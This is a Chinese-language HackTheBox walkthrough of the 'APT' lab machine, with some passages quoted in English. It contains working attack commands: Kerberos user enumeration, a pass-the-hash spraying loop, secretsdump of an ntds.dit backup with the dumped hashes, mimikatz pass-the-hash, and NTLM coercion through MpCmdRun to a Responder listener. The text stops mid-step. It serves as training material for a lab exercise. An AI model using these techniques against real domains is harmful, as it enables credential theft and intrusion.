靶机 10.10.10.213

kali  10.10.16.3

[HTB APT靶机渗透测试流程_Teardrop、的博客-CSDN博客](https://blog.csdn.net/RemedyVI/article/details/131945054)

[HTB: APT | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/04/10/htb-apt.html)

[HackTheBox - APT | Ef's log (fahmifj.github.io)](https://fahmifj.github.io/hackthebox/apt/)

```bash
└─# ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
└─# nmap -p$ports -sV -sC -O $ip -oN nmap.txt
```

```bash
PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```



# 135端口：

[135, 593 - Pentesting MSRPC - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc)

[MSRPC (Microsoft Remote Procedure Call) Service Enumeration | 0xffsec Handbook](https://0xffsec.com/handbook/services/msrpc/)

```bash
└─# rpcclient 10.10.10.213 -p 135
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
```

使用 python 套件，加入环境变量

```bash
┌──(root💀kali)-[~/apt]
└─# export PATH=/usr/share/doc/python3-impacket/examples:$PATH                                               
                               
┌──(root💀kali)-[~/apt]
└─# echo $PATH                                                                                             
/usr/share/doc/python3-impacket/examples:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/.dotnet/tools
```

```bash
└─# rpcdump.py 10.10.10.213 > rpcdump.list
```

```bash
└─# rpcdump.py 10.10.10.213                                                                                 
。。。。。。。。。。。
。。。。。。。。。。。。


┌──(root💀kali)-[~/apt]
└─# rpcdump.py 10.10.10.213 > rpcdump.list
                                                                                                                                                                  
┌──(root💀kali)-[~/apt]
└─# ls
nmap.txt  rpcdump.list
                                                                                                                                                                  
┌──(root💀kali)-[~/apt]
└─# cat rpcdump.list 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
。。。。。。。。。。。
。。。。。。。。
```



<img src=".\图片\Snipaste_2023-09-02_17-17-45.png" alt="Snipaste_2023-09-02_17-17-45" style="zoom:80%;" />

可能意思是，从 rpc 协议里的 DCOM 接口里找到一些 uuid ，这些 uuid 分别代表了不同的服务，再去搜索这些服务里有无可利用的信息

以下的命令为 枚举 uuid，这个过程很慢

```bash
rpcmap.py ncacn_ip_tcp:10.10.10.213[135] -brute-uuids -brute-opnums 
```

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Procotol: N/A
Provider: rpcss.dll
UUID: 00000136-0000-0000-C000-000000000046 v0.0
Opnums 0-64: rpc_s_access_denied

Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote
Provider: rpcss.dll
UUID: 000001A0-0000-0000-C000-000000000046 v0.0
Opnums 0-64: rpc_s_access_denied

Procotol: N/A
Provider: rpcss.dll
UUID: 0B0A6584-9E0F-11CF-A3CF-00805F68CB1B v1.0
Opnums 0-64: rpc_s_access_denied
........
........
```

这里直接选出得到的 uuid

通过 rpcmap 暴力枚 举UUID 和 DCOM 的操作数，发现是有两个可用的服务，一个是 DCOM，一个是 RPCE。

其中 UUID 为 `99FCFEC4-5260-101B-BBCB-00AA0021347A` 的操作数 3(ServerAlive) 和 5(ServerAlive2) 是可用的。

查找 exploit，全网搜所利用

<img src=".\图片\Snipaste_2023-09-02_18-00-17.png" alt="Snipaste_2023-09-02_18-00-17" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-09-02_18-09-15.png" alt="Snipaste_2023-09-02_18-09-15" style="zoom:80%;" />



```http
https://www.cyber.airbus.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/
https://github.com/mubix/IOXIDResolver/blob/master/IOXIDResolver.py
```

得到一个python脚本，可能是个找 ipv6 的功能

```python
#!/usr/bin/python

import sys, getopt

from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
from impacket.dcerpc.v5.dcomrt import IObjectExporter

def main(argv):

    try:
        opts, args = getopt.getopt(argv,"ht:",["target="])
    except getopt.GetoptError:
        print ('IOXIDResolver.py -t <target>')
        sys.exit(2)

    target_ip = "192.168.1.1"

    for opt, arg in opts:
        if opt == '-h':
            print ('IOXIDResolver.py -t <target>')
            sys.exit()
        elif opt in ("-t", "--target"):
            target_ip = arg

    authLevel = RPC_C_AUTHN_LEVEL_NONE

    stringBinding = r'ncacn_ip_tcp:%s' % target_ip
    rpctransport = transport.DCERPCTransportFactory(stringBinding)

    portmap = rpctransport.get_dce_rpc()
    portmap.set_auth_level(authLevel)
    portmap.connect()

    objExporter = IObjectExporter(portmap)
    bindings = objExporter.ServerAlive2()

    print ("[*] Retrieving network interface of " + target_ip)

    #NetworkAddr = bindings[0]['aNetworkAddr']
    for binding in bindings:
        NetworkAddr = binding['aNetworkAddr']
        print ("Address: " + NetworkAddr)

if __name__ == "__main__":
   main(sys.argv[1:])
```

```bash
└─# ./find_ipv6.py -t 10.10.10.213                                                                                                                            1 ⨯
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::b885:d62a:d679:573f
Address: dead:beef::ad30:7301:be5e:cdf9
Address: dead:beef::7a
```

找到了 ipv6 的地址

加到 hosts

```bash
echo 'dead:beef::b885:d62a:d679:573f apt' >> /etc/hosts
```



# nmap扫ipv6

```bash
nmap -6 -p- --min-rate 10000 -oN nmap-alltcp-ipv6 dead:beef::b885:d62a:d679:573f
```

```bash
nmap -6 -p 53,80,88,135,389,445,464,593,636,3268,3269,5985,9389 -sCV -0 -oN nmap-tcpscripts-ipv6 dead:beef::b885:d62a:d679:573f
```

```bash
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-server-header: 
|   Microsoft-HTTPAPI/2.0
|_  Microsoft-IIS/10.0
|_http-title: Bad Request
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-02 10:44:08Z)
135/tcp  open  msrpc        Microsoft Windows RPC
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2023-09-02T10:45:43+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
|_ssl-date: 2023-09-02T10:45:40+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2023-09-02T10:45:42+00:00; -1s from scanner time.
3269/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=apt.htb.local
| Subject Alternative Name: DNS:apt.htb.local
| Not valid before: 2020-09-24T07:07:18
|_Not valid after:  2050-09-24T07:17:18
|_ssl-date: 2023-09-02T10:45:40+00:00; -2s from scanner time.
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
9389/tcp open  mc-nmf       .NET Message Framing
No OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=6%D=9/2%OT=53%CT=%CU=%PV=N%DS=1%DC=D%G=Y%TM=64F31260%P=x8
OS:6_64-pc-linux-gnu)S1(P=6000{4}28063fXX{32}0035dda9a6e9dec3e86bd879a0122
OS:000808e000002040526010303080402080a00727b61ff{4}%ST=0.053089%RT=0.71082
OS:9)S2(P=6000{4}28063fXX{32}0035ddaa7c372abbe86bd87aa01220005f47000002040
OS:526010303080402080a00727b61ff{4}%ST=0.154473%RT=1.10656)S3(P=6000{4}280
OS:63fXX{32}0035ddab0d102dc5e86bd87ba0122000ce6300000204052601030308010108
OS:0a00727b61ff{4}%ST=0.255705%RT=1.10659)S4(P=6000{4}28063fXX{32}0035ddac
OS:a97dd73ce86bd87ca0122000857b000002040526010303080402080a00727b61ff{4}%S
OS:T=0.353257%RT=1.10656)S5(P=6000{4}28063fXX{32}0035ddad7c6db900e86bd87da
OS:0122000cf63000002040526010303080402080a00727cc3ff{4}%ST=0.454362%RT=1.1
OS:0665)S6(P=6000{4}24063fXX{32}0035ddae10b25e4de86bd87e90122000a9df000002
OS:0405260402080a00727cc3ff{4}%ST=0.554874%RT=1.10665)IE1(P=6000{4}803a3fX
OS:X{32}8100cacdabcd00{122}%ST=0.740784%RT=1.46105)TECN(P=602000{3}20063fX
OS:X{32}0035ddaffe2f08f3e86bd87f80522000a1b10000020405260103030801010402%S
OS:T=1.24924%RT=1.81405)EXTRA(FL=12345)

Network Distance: 1 hop
Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: apt
|   NetBIOS computer name: APT\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: apt.htb.local
|_  System time: 2023-09-02T11:45:16+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: -8m34s, deviation: 22m37s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-09-02T10:45:14
|_  start_date: 2023-09-02T08:40:18
```

一眼域控

I will take notes on:

- Domain name: `htb.local`
- FQDN: `apt.htb.local`
- Host: Windows Server 2016 Standard 14393

# 445

```bash
└─# smbclient -N -L //apt
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	backup          Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
apt is an IPv6 address -- no workgroup available
```

```bash
└─# smbclient \\\\dead:beef::b885:d62a:d679:573f\\backup
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 24 03:30:52 2020
  ..                                  D        0  Thu Sep 24 03:30:52 2020
  backup.zip                          A 10650961  Thu Sep 24 03:30:32 2020
bin
		5114623 blocks of size 4096. 2634162 blocks available
smb: \> binary
binary: command not found
smb: \> get backup.zip
getting file \backup.zip of size 10650961 as backup.zip (592.9 KiloBytes/sec) (average 592.9 KiloBytes/sec)
```



重新开始了，我的 kali ip变化 成了 `10.10.10.16.5`



# backzup.zip

`backup.zip` looks like the backup of an Active Directory environment. The files are the ones needed to restore an AD environment, or to maliciously dump all the hashes offline

```bash
└─# unzip -l backup.zip 
Archive:  backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2020-09-23 19:40   Active Directory/
 50331648  2020-09-23 19:38   Active Directory/ntds.dit
    16384  2020-09-23 19:38   Active Directory/ntds.jfm
        0  2020-09-23 19:40   registry/
   262144  2020-09-23 19:22   registry/SECURITY
 12582912  2020-09-23 19:22   registry/SYSTEM
---------                     -------
 63193088                     6 files
```

显示有密码，这里可以破解

```bash
└─# zip2john backup.zip > backup.zip.hash
```

```bash
└─# john backup.zip.hash --wordlist=/usr/share/wordlists/rockyou.txt   
└─# hashcat -m 17220 backup.zip.hash /usr/share/wordlists/rockyou.txt --user
```

得到密码 `iloveyousomuch` 

解压后得到域的用户密码信息的备份文件 `ntds.dit`

使用工具 `secretsdump.py`

```bash
secretsdump.py -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL > ad_hashes

或者

secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump
```

```bash
grep ':::' ad_hashes | wc -l
2000
```

# 尝试hash传递

```bash
└─# cat ad_hashes | grep ':::' ad_hashes | head -n 30
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::
jeb.sloan:3200:aad3b435b51404eeaad3b435b51404ee:9ea25adafeec63e38cef4259d3b15c30:::
ranson.mejia:3201:aad3b435b51404eeaad3b435b51404ee:3ae49ec5e6fed82ceea0dc2be77750ab:::
unice.daugherty:3202:aad3b435b51404eeaad3b435b51404ee:531c98e26cfa3caee2174af495031187:::
kazuo.deleon:3203:aad3b435b51404eeaad3b435b51404ee:fde29e6cb61b4f7fda1ad5cd2759329d:::
dacy.frederick:3204:aad3b435b51404eeaad3b435b51404ee:51d368765462e9c5aebc456946d8dc86:::
emeline.boone:3205:aad3b435b51404eeaad3b435b51404ee:273c48fb014f8e5bf9e2918e3bf7bfbd:::
baris.martin:3206:aad3b435b51404eeaad3b435b51404ee:98590500f99a1bee7559e97ad342d995:::
mea.cash:3207:aad3b435b51404eeaad3b435b51404ee:10cf01167854082e180cf549f63c0285:::
elie.petersen:3208:aad3b435b51404eeaad3b435b51404ee:813f9d0988b9242eec1e45907344b591:::
gaylene.stephenson:3209:aad3b435b51404eeaad3b435b51404ee:6149000a4f3f7c57642cbee1ea70c3e1:::
rodrigo.cannon:3210:aad3b435b51404eeaad3b435b51404ee:f225672e2ce8192cafe0145842b28e14:::
fawnia.baldwin:3211:aad3b435b51404eeaad3b435b51404ee:d7d8f549bc7c89be8596ffa3c177548d:::
kizzy.holland:3212:aad3b435b51404eeaad3b435b51404ee:778df07e2d1405854b08f0477d8278c1:::
gretna.carroll:3213:aad3b435b51404eeaad3b435b51404ee:62a7c0ae9826573f70d7839658cc53e8:::
julee.curry:3214:aad3b435b51404eeaad3b435b51404ee:5feeeb99edfa4c0e1a3674459321b143:::
lavina.ellison:3215:aad3b435b51404eeaad3b435b51404ee:0d7bddb6e81ce55420b0fe075fa26758:::
rois.cabrera:3216:aad3b435b51404eeaad3b435b51404ee:fcd3287c43fc4d16c498f7c25e0773d1:::
melvin.cantu:3217:aad3b435b51404eeaad3b435b51404ee:727e272a654df4188c4bb27f97ee97ba:::
badri.maynard:3218:aad3b435b51404eeaad3b435b51404ee:9d6c6eb8366c4445a715f86eb77d8125:::
peregrine.cooper:3219:aad3b435b51404eeaad3b435b51404ee:bf6fe413edb71c0cb36cda7d8a556359:::
jemmy.fulton:3220:aad3b435b51404eeaad3b435b51404ee:4fd8ce6644522dab686ebef9fcb020ce:::
christabella.wells:3221:aad3b435b51404eeaad3b435b51404ee:ac2515432deb820d9ee0fba201df4ea6:::
katleen.mccullough:3222:aad3b435b51404eeaad3b435b51404ee:4bf0bf66851db901f83fcd62310d6307:::
chris.simmons:3223:aad3b435b51404eeaad3b435b51404ee:0c9ef87603f3e43b8b2c9a0ed5595cc9:::
myrle.waters:3224:aad3b435b51404eeaad3b435b51404ee:fa1697a4c1dbcb33bb7d9118a389b8bc:::
```

administrator 哈希传递失败

```bash
└─# evil-winrm -i apt -u administrator -H '2b576acbe6bcfda7294d6bd18041b8fe'
```



提取用户名

```bash
└─# cat ad_hashes | grep ':::' | awk -F ':' '{print $1}' > user.list
```

提取hash

```bash
└─# cat ad_hashes | grep ':::' | awk -F ':' '{print $3,$4}' | sed 's/ /:/g' > hash.list
```



2000个用户2000个hash去碰撞的话计算量太大，流量也太大

所以，要在2000个用户中筛选哪些用户是有效的。根据域用户的认证机制，去匹配存在用户和不存在的用户的返回信息是不一样的，根据这个机制去枚举哪些用户是有效的



工具1 [Release v1.0.3 · ropnop/kerbrute · GitHub](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3) 

```bash
└─# ./kerbrute_linux_amd64 userenum -d htb.local --dc apt user.list 
```

```bash
./kerbrute_linux_amd64 userenum  --dc apt --domain htb.local user.list
```

```
2023/09/02 23:16:32 >  [+] VALID USERNAME:	 Administrator@htb.local
2023/09/02 23:16:32 >  [+] VALID USERNAME:	 APT$@htb.local
2023/09/02 23:21:32 >  [+] VALID USERNAME:	 henry.vinson@htb.local
```



工具2 nmap

<img src=".\图片\Snipaste_2023-09-03_10-38-20.png" alt="Snipaste_2023-09-03_10-38-20" style="zoom:80%;" />

```bash
└─# nmap -6 -p88 --script=krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=user.list apt 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 23:32 EDT
Nmap scan report for apt (dead:beef::b885:d62a:d679:573f)
Host is up (0.40s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     Administrator@htb.local
|     henry.vinson@htb.local
|_    APT$@htb.local
```



尝试用 原本 `ad_hashes`  里  henry.vinson 的  hash 来传递，失败了

```bash
evil-winrm -i apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f
```



把以上三个用户做成字典

```bash
# cat user3.list             
Administrator
henry.vinson
APT$
```

3个用户和2000个hash，尝试密码喷射，`crackmapexec`

```bash
crackmapexec smb htb.local -u user3.list -H hash.list
```

我没尝试，因为会封 ip



## 匹配hash

于是要用 getTGT.py ，**验证用户名和hash匹配在一起**，能否生成 票据，这里使用 `henry.vinson` 用户名，枚举它的 hash

写一个循环

<img src=".\图片\Snipaste_2023-09-03_11-54-39.png" alt="Snipaste_2023-09-03_11-54-39" style="zoom: 80%;" />

```sh
#!/bin/bash

while IFS='' read -r LINE || [-n "${LINE}" ]
do
      echo "----------------------"
      echo " Feed the Hash:${LINE}"
      /usr/share/doc/python3-impacket/examples/getTGT.py apt/henry.vinson@htb.local -hashes ${LINE}
      
done < hash.list      
```

监听本地文件的生成

```bash
watch "ls -ltr | tail -2"
```

得到 hash

```
aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
```



同理还有个工具https://github.com/3gstudent/pyKerbrute

```
python ADPwdSpray.py apt htb.local 'henry.vinson' hash.list 
```



# 横向移动

记得  htb.local 绑定到 hosts，

```bash
└─# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
dead:beef::b885:d62a:d679:573f apt htb.local
```



失败

```bash
└─# evil-winrm -i htb.local -u henry.vinson -H 'e53d87d42adaa3ca32bdb34a876cbffb'
```

失败

```bash
└─# psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local         
```

失败

```
wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local  
```

失败

```bash
└─# dcomexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local 
```

失败

```
└─# smbexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' htb.local/henry.vinson@htb.local 
```

## 方式一

读取注册表

```bash
└─# reg.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU
HKU\Console
HKU\Control Panel
HKU\Environment
HKU\Keyboard Layout
HKU\Network
HKU\Software
HKU\System
HKU\Volatile Environment
```

```bash
└─# reg.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\Software 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software
HKU\Software\GiganticHostingManagementSystem
HKU\Software\Microsoft
HKU\Software\Policies
HKU\Software\RegisteredApplications
HKU\Software\Sysinternals
HKU\Software\VMware, Inc.
HKU\Software\Wow6432Node
HKU\Software\Classes
```

```bash
└─# reg.py -hashes 'aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb' -dc-ip apt htb.local/henry.vinson@htb.local query -keyName HKU\\Software\\GiganticHostingManagementSystem
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\Software\GiganticHostingManagementSystem
	UserName	REG_SZ	 henry.vinson_adm
	PassWord	REG_SZ	 G1#Ny5@2dvht
```

得到了 账号密码

```
henry.vinson_adm
G1#Ny5@2dvht
```

继续横向

```bash
└─# evil-winrm -i htb.local -u henry.vinson_adm -p 'G1#Ny5@2dvht'                                                                                             1 ⨯
                                        
Evil-WinRM shell v3.5 
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Info: Establishing connection to remote endpoint 
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> whoami
htb\henry.vinson_adm
```



查看 flag

```powershell
type *Evil-WinRM* PS C:\Users\henry.vinson_adm\desktop> type user.txt
a709fbd1682b672bf834c740e80e943c
```



## 方式二

kali ip 变动 10.10.16.5

henry.vinson doesn’t have permissions to do WinRM and isn’t admin (so no `psexec`). Still, there are things that you can do with credentials for an unprivileged user. If I had a plaintext password, I could open a `cmd` windows using `runas` and the `/netonly` flag. This stores the given credentials in my local system memory as if I’m that remote user, and when I try to run something interacting with the remote domain, the credentials are validated at that DC. This terminal could be used to run commands that run on remote computers.

Windows doesn’t provide an interface to do that authentication with a hash, but [Mimikatz](https://github.com/gentilkiwi/mimikatz) does. In my Windows VM, I’ll run `mimikatz.exe` as administrator. I’ll need to enable debug privileges:

```
mimikatz # privilege::debug
Privilege '20' OK
```

Now I can use the `sekurlsa::pth` command to start a CMD window with the creds for htb.local/henry.vinson:

```powershell
mimikatz # sekurlsa::pth /user:henry.vinson /domain:htb.local /dc:htb.local /ntlm:e53d87d42adaa3ca32bdb34a876cbffb /command:powershell
user    : henry.vinson
domain  : htb.local
program : cmd.exe
impers. : no
NTLM    : e53d87d42adaa3ca32bdb34a876cbffb
  |  PID  8512
  |  TID  1072
  |  LSA Process was already R/W
  |  LUID 0 ; 26311359 (00000000:01917abf)
  \_ msv1_0   - data copy @ 000002268D405640 : OK !
  \_ kerberos - data copy @ 000002268D6F4D08
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000002268C873828 (32) -> null
```

This pops a new `cmd.exe` windows on my VM that has creds for henry.vinson cached.

There wasn’t a ton I could do as henry.vinson, but I was able to [remote access the registry](https://itfordummies.net/2016/09/06/read-remote-registry-powershell/), but only the HKCU hive:

```pow\
PS > $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'htb.local')
PS > $key = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
Exception calling "OpenSubKey" with "1" argument(s): "Requested registry access is not allowed."
At line:1 char:1
+ $key = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : SecurityException

PS > $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', 'htb.local')
PS > $key = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows\CurrentVersion\Run')
```

In the output above I went for a key I know well from malware persistence, and there was nothing there, but it shows that I can access HKCU. That works because henry.vinson is currently logged onto APT, as shown by `Get-NetSession` from [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon):

```powershell
PS > Get-NetSession -ComputerName htb.local


sesi10_cname     : \\[dead:beef:2::1007]
sesi10_username  : henry.vinson
sesi10_time      : 153
sesi10_idle_time : 0
ComputerName     : htb.local
```

Looking around HKCU, there’s an interesting bit of software that jumped out, `GiganticHostingManagementSystem`:

```powershell
PS > $reg.OpenSubKey('SOFTWARE').getSubkeyNames()
GiganticHostingManagementSystem
Microsoft
Policies
RegisteredApplications
VMware, Inc.
Wow6432Node
Classes
```

This key has two values, which look to be creds for henry.vinson_adm:

```powershell
PS > $reg.OpenSubKey('SOFTWARE\GiganticHostingManagementSystem').getValueNames()
UserName
PassWord
PS > $reg.OpenSubKey('SOFTWARE\GiganticHostingManagementSystem').GetValue('UserName')
henry.vinson_adm
PS > $reg.OpenSubKey('SOFTWARE\GiganticHostingManagementSystem').GetValue('Password')
G1#Ny5@2dvht
```



# 提权与后渗透

此时四处翻找靶机中有用的信息，推荐一个 windows 重要文件的列表 [Auto_Wordlists/wordlists/file_inclusion_windows.txt at main · carlospolop/Auto_Wordlists · GitHub](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)

<img src=".\图片\Snipaste_2023-09-11_12-41-00.png" alt="Snipaste_2023-09-11_12-41-00" style="zoom:80%;" />

这是个 powershell 的历史记录

[PowerShell History File | 0xdf hacks stuff](https://0xdf.gitlab.io/2018/11/08/powershell-history-file.html)

查看

```powershell
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> cd C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline> ls


    Directory: C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/10/2020  10:58 AM            458 ConsoleHost_history.txt
```

```powershell
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline> type ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
```

根据 [Network security LAN Manager authentication level - Windows Security | Microsoft Learn](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level) ， `Value 2` 这里的意思是强行把认证修改为了 NTLMv1 认证，而 NTLMv1 认证是有缺陷可破破解利用的

<img src=".\图片\Snipaste_2023-09-11_12-47-02.png" alt="Snipaste_2023-09-11_12-47-02" style="zoom:67%;" />

验证当前是否为 NTMLV1 认证

```powershell
*Evil-WinRM* PS C:\> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel


lmcompatibilitylevel : 2
PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
PSChildName          : Lsa
PSDrive              : HKLM
PSProvider           : Microsoft.PowerShell.Core\Registry
```

另外，[Seatbelt](https://github.com/GhostPack/Seatbelt#command-groups) （类似 winpeas）工具也可以验证 当前为 NTMLV1 认证

```powershell
Invoke-Binary ./Seatbelt.exe -group=all
```



## Responder配合攻击NTLMv1

Responder 攻击详情见

 [内网渗透之Responder攻防（上） - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/256844.html)

[内网渗透之Responder演练（下） - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/265246.html)



靠山吃山原则 [LOLBAS (lolbas-project.github.io)](https://lolbas-project.github.io/) ，用 MpCmdRun.exe 尝试访问 kali 并携带 NTLMv1 的值

```
.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.16.5\share\file.txt
```



把 Responder.conf 里的 challenge 值改为 1122334455667788 ，后续配合网站 [Cracking NETLM/NETNTLMv1 Authentication | crack.sh](https://crack.sh/netntlm/)   https://crack.sh/   破解hash

```
challenge=1122334455667788
```

使用 [GitHub - lgandx/Responder ](https://github.com/lgandx/Responder)监听，得到 `APT$ `用户 ntlmv1 的hash

```bash
└─# python Responder.py -I tun0 --lm
```

```bash
[SMB] NTLMv1 Client   : 10.10.10.213
